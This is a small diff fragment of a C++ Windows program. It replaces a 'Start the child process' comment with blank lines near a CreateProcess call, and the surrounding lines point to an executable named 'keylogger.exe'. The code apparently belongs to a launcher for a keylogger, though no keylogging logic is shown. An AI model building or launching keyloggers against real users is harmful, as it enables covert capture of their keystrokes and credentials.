@@ -23,7 +23,8 @@ int _tmain(int argc, _TCHAR* argv[])
     ZeroMemory(&pi_2, sizeof(pi_2));
     LPCTSTR lpApplication_2 = _T(".\\keylogger.exe");
 
-    // Start the child process.
+   
+   
     if (!CreateProcess(lpApplicationName,   // No module name (use command line)
         NULL,        // Command line
         NULL,           // Process handle not inheritable
